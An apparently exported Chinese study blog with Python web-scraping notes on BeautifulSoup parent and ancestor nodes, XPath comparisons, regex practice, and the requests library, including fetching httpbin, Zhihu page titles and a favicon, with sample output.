<h4 id="父节点和祖先节点"><a href="#父节点和祖先节点" class="headerlink" title="父节点和祖先节点"></a>父节点和祖先节点</h4><p>想要获得某个节点元素的父节点，可以调用parent属性：<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">html = """</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>The Dormouse's story<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"story"</span>&gt;</span></span><br><span class="line">            Once upon a time there were three little sisters; and their names were</span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://example.com/elsie"</span> <span class="attr">class</span>=<span class="string">"sister"</span> <span class="attr">id</span>=<span class="string">"link1"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span>&gt;</span>Elsie<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"story"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">"""</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html, 'lxml')</span><br><span class="line">print(soup.a.parent)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"story"</span>&gt;</span></span><br><span class="line">            Once upon a time there were three little sisters; and their names were</span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"sister"</span> <span class="attr">href</span>=<span class="string">"http://example.com/elsie"</span> <span class="attr">id</span>=<span class="string">"link1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>Elsie<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><br>我们选择的是第一个a标签的父节点元素，所以就是p节点，返回的内容便是p节点中所有的内容</p>
<p>如果我们想获取所有的祖先节点，可以调用parents属性<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">html = """</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"story"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://example.com/elsie"</span> <span class="attr">class</span>=<span class="string">"sister"</span> <span class="attr">id</span>=<span class="string">"link1"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span>&gt;</span>Elsie<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">"""</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html, 'lxml')</span><br><span class="line">print(type(soup.a.parents))</span><br><span class="line">print(list(enumerate(soup.a.parents)))</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="tag">&lt;<span class="name">class</span> '<span class="attr">generator</span>'&gt;</span></span><br><span class="line">[(0, <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"story"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"sister"</span> <span class="attr">href</span>=<span class="string">"http://example.com/elsie"</span> <span class="attr">id</span>=<span class="string">"link1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>Elsie<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span>), (1, <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"story"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"sister"</span> <span class="attr">href</span>=<span class="string">"http://example.com/elsie"</span> <span class="attr">id</span>=<span class="string">"link1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>Elsie<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span>), (2, <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"story"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"sister"</span> <span class="attr">href</span>=<span class="string">"http://example.com/elsie"</span> <span class="attr">id</span>=<span class="string">"link1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>Elsie<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span>), (3, <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"story"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"sister"</span> <span class="attr">href</span>=<span class="string">"http://example.com/elsie"</span> <span class="attr">id</span>=<span class="string">"link1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span>Elsie<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span>)]</span><br></pre></td></tr></table></figure><br>我们可以看到，使用了列表和枚举类型来输出，输出的第一个元素是p标签所有的内容，然后是body，也就是p标签的父节点，之后是html节点也就是body的父节点</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.XPath中/为访问直接子节点，//为访问所有子节点</p>
<p>2.在查询子节点的时候，虽然可以使用/，但是不推荐，应该如果没有直接子节点就不会返回内容</p>
<p>3.在使用text()方法的时候，推荐使用//，这样可以确保查找到所有子节点，而不会导致没有直接子节点从而没有返回结果的情况</p>
<p>4.属性匹配是中括号加属性名和值来限定某个属性，如[@href=”link1.html”]，而此处的@href指的是获取节点的某个属性，二者需要做好区分</p>
<p>5.Beautiful Soup比XPath更加方便快捷，他们两者的使用方法很类似，XPath用//代表访问子孙节点，而BS使用descendants属性，使用更加方便，便于理解</p>
<p>6.children属性只能获取直接子节点，和XPath中的/类似</p>
<p>7.XPath中并没有提供方法获取父节点或祖先节点，BS中可以使用parent和parents属性来获取父节点和祖先节点</p>
<p>8.注意BS在使用parent或parents属性时，输出的内容是由内到外遍历，也就是从小到大以此输出该节点中的所有内容</p>
<p>9.如果某个节点中包含了子节点，那么这个子节点中的文本内容在输出父节点时，也属于节点，会随着一起输出</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Python3开发</category>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3-2020/3/22-requests</title>
    <url>/2020/03/21/Python3-2020-3-22-%E5%91%A8%E6%8A%A54/</url>
    <content><![CDATA[<h1 id="正则补充"><a href="#正则补充" class="headerlink" title="正则补充"></a>正则补充</h1><p>学完urllib和正则之后，想试验一下，去抓了一下i春秋课程的标题，结果没有伪造成浏览器，被封IP地址了。。。</p>
<p>所以只好用我们学校教务系统的登录界面来简单试验一下：</p>
<p>1.首先用Regester工具简单测试一下我们的正则是否有效<br><img src="/img/python3/1.png" alt="avatar"></p>
<p>由于刚学完正则，运用的还不是特别熟练，之前i春秋的标题抓的很难受<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">h3</span>&gt;</span><span class="tag">&lt;<span class="name">a</span>&gt;</span>...<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><br>是大概这样的，一直以为要全部写出来 但是实际上只用取关键部分，就比如标题的id选择器都是一样的，然后采用上图的方法就可以实现</p>
<p>2.写脚本，先让他抓取网页源码，测试一下连通<br><img src="/img/python3/2.png" alt="avatar"><br>成功抓取到之后，使用正则</p>
<p>3.加上正则抓取<br><img src="/img/python3/3.png" alt="avatar"></p>
<p>成功抓到并存放的一个列表里</p>
<h1 id="requests库"><a href="#requests库" class="headerlink" title="requests库"></a>requests库</h1><p>urllib库中的urlopen()方法实际上是以GET方法请求网页的，而requests中相应的方法就是get()方法，更加直观明确<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">r=requests.get("http://www.baidu.com/")</span><br><span class="line">print(type(r))</span><br><span class="line">print(r.status_code)</span><br><span class="line">print(type(r.text))</span><br><span class="line">print(r.text)</span><br><span class="line">print(r.cookie)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="tag">&lt;<span class="name">class</span> '<span class="attr">requests.models.Response</span>'&gt;</span></span><br><span class="line">200</span><br><span class="line"><span class="tag">&lt;<span class="name">class</span> '<span class="attr">str</span>'&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span> <span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">content-type</span> <span class="attr">content</span>=<span class="string">text/html;charset</span>=<span class="string">utf-8</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">X-UA-Compatible</span> <span class="attr">content</span>=<span class="string">IE</span>=<span class="string">Edge</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">content</span>=<span class="string">always</span> <span class="attr">name</span>=<span class="string">referrer</span>&gt;</span>......</span><br></pre></td></tr></table></figure></p>
<h2 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h2><figure class="highlight processing"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">r=requests.<span class="built_in">get</span>(<span class="string">'http://httpbin.org/get'</span>)</span><br><span class="line"><span class="built_in">print</span>(r.<span class="built_in">text</span>)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"args"</span>: &#123;&#125;, </span><br><span class="line">  <span class="string">"headers"</span>: &#123;</span><br><span class="line">    <span class="string">"Accept"</span>: <span class="string">"*/*"</span>, </span><br><span class="line">    <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>, </span><br><span class="line">    <span class="string">"Host"</span>: <span class="string">"httpbin.org"</span>, </span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"python-requests/2.22.0"</span>, </span><br><span class="line">    <span class="string">"X-Amzn-Trace-Id"</span>: <span class="string">"Root=1-5e76aa77-0ab221409bccbc362bc8ff1c"</span></span><br><span class="line">  &#125;, </span><br><span class="line">  <span class="string">"origin"</span>: <span class="string">"117.136.85.194"</span>, </span><br><span class="line">  <span class="string">"url"</span>: <span class="string">"http://httpbin.org/get"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>比urllib库更加直观<br>这只是一个简单的GET请求，要是想添加两个参数，例如添加name:germey,age:22；就可以利用params这个参数，这些数据一般用字典存储</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">data</span>=&#123;</span><br><span class="line">    <span class="string">'name'</span>:<span class="string">'germey'</span>,</span><br><span class="line">    <span class="string">'age'</span>:<span class="number">22</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(<span class="string">'http://httpbin.org/get'</span>,params=<span class="keyword">data</span>)</span><br><span class="line">print(r.<span class="keyword">text</span>)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"args"</span>: &#123;</span><br><span class="line">    <span class="string">"age"</span>: <span class="string">"22"</span>, </span><br><span class="line">    <span class="string">"name"</span>: <span class="string">"germey"</span></span><br><span class="line">  &#125;, </span><br><span class="line">  <span class="string">"headers"</span>: &#123;</span><br><span class="line">    <span class="string">"Accept"</span>: <span class="string">"*/*"</span>, </span><br><span class="line">    <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>, </span><br><span class="line">    <span class="string">"Host"</span>: <span class="string">"httpbin.org"</span>, </span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"python-requests/2.22.0"</span>, </span><br><span class="line">    <span class="string">"X-Amzn-Trace-Id"</span>: <span class="string">"Root=1-5e76ab8e-3837588fc919bb2c6e68e997"</span></span><br><span class="line">  &#125;, </span><br><span class="line">  <span class="string">"origin"</span>: <span class="string">"117.136.85.194"</span>, </span><br><span class="line">  <span class="string">"url"</span>: <span class="string">"http://httpbin.org/get?name=germey&amp;age=22"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到已经添加进去了，而且URL自动被构造成了<code>http://httpbin.org/get?name=germey&amp;age=22</code></p>
<p>网页返回类型实际上是str类型，但是比较特殊的是它是JSON格式的，所以想要直接解析返回结果，得到一个字典格式的话，可以直接调用json()方法<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">r=requests.get(<span class="string">'http://httpbin.org/get'</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(type(r.text)</span></span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(r.json()</span></span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(type(r.json()</span></span>))</span><br></pre></td></tr></table></figure><br>运行结果：<br><figure class="highlight ceylon"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">class</span> <span class="string">'str'</span>&gt;</span><br><span class="line">&#123;<span class="string">'args'</span>: &#123;&#125;, <span class="string">'headers'</span>: &#123;<span class="string">'Accept'</span>: <span class="string">'*/*'</span>, <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>, <span class="string">'Host'</span>: <span class="string">'httpbin.org'</span>, <span class="string">'User-Agent'</span>: <span class="string">'python-requests/2.22.0'</span>, <span class="string">'X-Amzn-Trace-Id'</span>: <span class="string">'Root=1-5e76ac6b-1f1a35dd4bcc9427117952e8'</span>&#125;, <span class="string">'origin'</span>: <span class="string">'117.136.85.194'</span>, <span class="string">'url'</span>: <span class="string">'http://httpbin.org/get'</span>&#125;</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">'dict'</span>&gt;</span><br></pre></td></tr></table></figure><br>返回的是JSON格式的字符串转换成字典，如果返回结果不是JSON格式，则会抛出json.decoder.JSONDecodeError异常</p>
<h3 id="抓取网页"><a href="#抓取网页" class="headerlink" title="抓取网页"></a>抓取网页</h3><p>抓一下知乎里的发现，这里要注意，如果你不设置user-agent，脚本就会默认,urllib默认就是urllib-agent，这样的设置会让网站直接把你识别为脚本，封IP</p>
<p>除了user-agent，还有refer,cookie等，在后面会用到<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line">	'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'</span><br><span class="line">&#125;</span><br><span class="line">r=requests.get("https://www.zhihu.com/explore", headers=headers)</span><br><span class="line">pattern=re.compile(r'class=".*?" href=".*?" target=".*?" data-za-detail-view-id=".*?"&gt;(.*?)<span class="tag">&lt;/<span class="name">a</span>&gt;</span>')</span><br><span class="line">titles=re.findall(pattern,r.text)</span><br><span class="line">print(titles)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">['<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://pic2.zhimg.com/100/v2-9d2e47fb42725f69e11093b92beeea7d_hd.png"</span>/&gt;</span>', '选个新电脑，助攻云学习\t', '选个学习本', '平板电脑不纠结', '即将上大学，所以笔记本电脑和ipad哪个更适合？ ', '新机打开方式', '刚买了 iPad 以后有什么需要注意的地方？ ', '<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://pic4.zhimg.com/100/v2-0c40996ceafa04e9f4576f3e8ad4ac8b_hd.png"</span>/&gt;</span>', '直击苹果「突然」发布会', '新 iPad Pro', 'iPad Pro，一块板子也有了双摄', '新 A12Z', '估计就是个满血版的 A12X', '新 Magic Keyboard', '全尺寸键盘+触控板+悬浮固定', '<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://pic3.zhimg.com/100/v2-d160bedfe5c7d4e36afb81dffb620892_hd.png"</span>/&gt;</span>', '100+ 大开脑洞的 AI 故事', '突然变身 AI 的我…', '他无比忐忑、却期待地按下了按钮', '如果医护人员都变成 AI…', '你不爱熬中药，无人机会给你空投到你家后院（中医粉最爱）', '电竞主播与 AI 谁能赢？', '可以把 AI 理解成一个全程都在「三指操作」的玩家', '<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://pic3.zhimg.com/100/v2-11255ee7502d88a11570e1e2524dbeca_hd.png"</span>/&gt;</span>', '身边的她们，平凡中闪烁着光辉', '17 个精选图片故事', '97 岁的太太，一生辛苦却从未丢失善良', '特别鸣谢六位评审', '17 个精选图片故事', '我的妈妈，一位平凡的打工者', '下一站，在线教育？', '2020 会成为在线教育的风口吗？受疫情影响，大量转线上教育的产业是能继续高歌还是「昙花一现」？知乎机构号团队、知乎校园联手多家权威机构，来聊聊有关在线教育的现在与未来。', '如何看待钉钉因在线授课，导致大量学生给钉钉差评？', '疫情影响全球近 3 亿人无法到校上课，网络教学会因此在全球风靡吗？', '2020 会成为在线教育行业的重要节点吗？在线教育相比线下有哪些独特的优势？', '转型季 | 一起到线上工作创业', '受新冠肺炎疫情影响，很多线下的服务、销售等行业受到冲击。而直播、电商、短视频等线上工作逆势而起，成为新的创业和转型的机会风口。知乎邀请 B 站、淘宝直播、快手等专业平台和 MCN 机构来一起讨论转型线上工作的机会，并通过红人、投资人、从业者的经验和干货分享，来帮助新用户顺利转型或是开启一份副业，从而获得新的发展机会。', '直播行业真的赚钱吗？', '怎么得到一个可靠的线上副业？', '如何看待罗永浩进军电商直播领域，他会成为数码产品带货一哥吗？', '「甄嬛宇宙」开发计划', '作为古装电视剧经典之作，这部处处暗藏惊喜又「细思极恐」的 IP，大家能延展出怎样的脑洞？被网友们誉为「下饭神剧」，是不是身边就有它的爱好者？此次我们邀请到《甄嬛传》的主创、优秀编剧、网文大神以及十级甄嬛学者加入，共同开启「甄嬛宇宙」开发计划。', '《甄嬛传》中，如果皇帝和果郡王的人设互换，故事的走向会是怎样的？', '如果你来给穿越小说写剧本，你会把背景设定在哪里？', '《甄嬛传》中有哪些值得深思的细节？', '抗疫知识库 | 不懂不睡', '随着境外输入病例的出现及全球范围内疫情的持续增长，新冠肺炎的「全球大流行」或许才刚刚开始。在中国经验和国外方法的共同努力下，这场疫情最终将如何被解决？', '这次新型肺炎疫苗大概要多久才能研发成功并上市使用?', '如何看待美国跳过灵长类动物实验直接开展新冠病毒疫苗人体测试？', '疫情防控，最难的是什么？最怕的是什么？', '06-新观点，新思维，新世界', '笑翘姑娘的宠物', '如何看待特朗普将新冠病毒称为「中国病毒」？合适吗？', '傅盛，唏嘘', '已收藏 <span class="comment">&lt;!-- --&gt;</span>3,213<span class="comment">&lt;!-- --&gt;</span> 条内容<span class="tag">&lt;<span class="name">svg</span> <span class="attr">class</span>=<span class="string">"Zi Zi--ArrowRight"</span> <span class="attr">fill</span>=<span class="string">"currentColor"</span> <span class="attr">viewBox</span>=<span class="string">"0 0 24 24"</span> <span class="attr">width</span>=<span class="string">"24"</span> <span class="attr">height</span>=<span class="string">"24"</span>&gt;</span><span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">"M9.218 16.78a.737.737 0 0 0 1.052 0l4.512-4.249a.758.758 0 0 0 0-1.063L10.27 7.22a.737.737 0 0 0-1.052 0 .759.759 0 0 0-.001 1.063L13 12l-3.782 3.716a.758.758 0 0 0 0 1.063z"</span> <span class="attr">fill-rule</span>=<span class="string">"evenodd"</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span>', '拿来主义', '多放葱', 'Windows 下有什么用过之后就离不开的冷门软件？', '啊~~这血淋淋的抄底', '已收藏 <span class="comment">&lt;!-- --&gt;</span>1,101<span class="comment">&lt;!-- --&gt;</span> 条内容<span class="tag">&lt;<span class="name">svg</span> <span class="attr">class</span>=<span class="string">"Zi Zi--ArrowRight"</span> <span class="attr">fill</span>=<span class="string">"currentColor"</span> <span class="attr">viewBox</span>=<span class="string">"0 0 24 24"</span> <span class="attr">width</span>=<span class="string">"24"</span> <span class="attr">height</span>=<span class="string">"24"</span>&gt;</span><span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">"M9.218 16.78a.737.737 0 0 0 1.052 0l4.512-4.249a.758.758 0 0 0 0-1.063L10.27 7.22a.737.737 0 0 0-1.052 0 .759.759 0 0 0-.001 1.063L13 12l-3.782 3.716a.758.758 0 0 0 0 1.063z"</span> <span class="attr">fill-rule</span>=<span class="string">"evenodd"</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span>', '外汇心得种种', '智能大象', '除了“截断亏损让利润奔跑”，还有其他类型的交易逻辑吗？', '都说破坏容易创造难，那么如何最省力的破坏已有的趋势形成新的趋势？', '已收藏 <span class="comment">&lt;!-- --&gt;</span>584<span class="comment">&lt;!-- --&gt;</span> 条内容<span class="tag">&lt;<span class="name">svg</span> <span class="attr">class</span>=<span class="string">"Zi Zi--ArrowRight"</span> <span class="attr">fill</span>=<span class="string">"currentColor"</span> <span class="attr">viewBox</span>=<span class="string">"0 0 24 24"</span> <span class="attr">width</span>=<span class="string">"24"</span> <span class="attr">height</span>=<span class="string">"24"</span>&gt;</span><span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">"M9.218 16.78a.737.737 0 0 0 1.052 0l4.512-4.249a.758.758 0 0 0 0-1.063L10.27 7.22a.737.737 0 0 0-1.052 0 .759.759 0 0 0-.001 1.063L13 12l-3.782 3.716a.758.758 0 0 0 0 1.063z"</span> <span class="attr">fill-rule</span>=<span class="string">"evenodd"</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span>', '行业研究', '面壁者', '哈萨克毡房：草原上的“白宫”，特色的传统建筑！', 'YouTube最新数据：年收超过10000美金的油管频道增加了50%', '已收藏 <span class="comment">&lt;!-- --&gt;</span>34,474<span class="comment">&lt;!-- --&gt;</span> 条内容<span class="tag">&lt;<span class="name">svg</span> <span class="attr">class</span>=<span class="string">"Zi Zi--ArrowRight"</span> <span class="attr">fill</span>=<span class="string">"currentColor"</span> <span class="attr">viewBox</span>=<span class="string">"0 0 24 24"</span> <span class="attr">width</span>=<span class="string">"24"</span> <span class="attr">height</span>=<span class="string">"24"</span>&gt;</span><span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">"M9.218 16.78a.737.737 0 0 0 1.052 0l4.512-4.249a.758.758 0 0 0 0-1.063L10.27 7.22a.737.737 0 0 0-1.052 0 .759.759 0 0 0-.001 1.063L13 12l-3.782 3.716a.758.758 0 0 0 0 1.063z"</span> <span class="attr">fill-rule</span>=<span class="string">"evenodd"</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span>', '<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://pic4.zhimg.com/v2-3a001ea857606621edb4ec6eadcdd640_xl.jpg"</span>/&gt;</span>', '金州记', '<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://pic4.zhimg.com/v2-034d9ac552750046496bc62437feb7cc_xl.jpg"</span>/&gt;</span>', '张尧浠:《玩赚黄金投资交易》', '<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://pic2.zhimg.com/v2-02ddf2fb3c22162962a156a5adb95e09_xl.jpg"</span>/&gt;</span>', '摇摆电影', '<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://pic4.zhimg.com/v2-683e93dcf9e16d9e196c37e0290728a3_xl.jpg"</span>/&gt;</span>', '李北辰']</span><br></pre></td></tr></table></figure><br>几乎是抓到了该页面的所有标题部分的内容</p>
<h3 id="抓取二进制数据"><a href="#抓取二进制数据" class="headerlink" title="抓取二进制数据"></a>抓取二进制数据</h3><p>图片，视频，音频等这些文件本质上都是由二进制码组成的，由于特定的格式，需要对应的解析方式<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">r=requests.get(<span class="string">"https://github.com/favicon.ico"</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(r.text)</span></span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(r.content)</span></span></span><br></pre></td></tr></table></figure><br>运行结果：<br><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">b'<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>02<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>10<span class="tag">\<span class="name">x</span></span>10<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>00 <span class="tag">\<span class="name">x</span></span>00(<span class="tag">\<span class="name">x</span></span>05<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00&amp;<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00  <span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>00 <span class="tag">\<span class="name">x</span></span>00(<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00N<span class="tag">\<span class="name">x</span></span>05<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00(<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>10<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00 <span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>00 <span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>05<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span 